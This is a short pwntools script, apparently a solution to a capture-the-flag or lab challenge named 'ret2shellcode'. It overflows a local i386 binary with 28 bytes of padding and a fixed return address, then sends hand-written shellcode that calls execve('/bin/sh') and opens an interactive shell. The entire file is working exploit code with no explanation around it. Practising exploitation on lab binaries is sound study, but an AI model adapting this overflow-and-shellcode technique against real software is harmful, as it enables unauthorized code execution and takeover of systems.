from pwn import*
context.log_level = 'debug'
context.arch = 'i386'
o = process("./ret2shellcode")

payload = b'a'*28 + p32(0x804a040)
o.sendline(payload)

# execve("/bin/sh", 0, 0)
shellcode = '''
push 0x0068732f
push 0x6e69622f
push esp
pop ebx
xor ecx, ecx
xor edx, edx
mov eax, 50
xor eax, 57
int 0x80
'''
payload = asm(shellcode)
pause()
o.sendline(payload)

o.interactive()
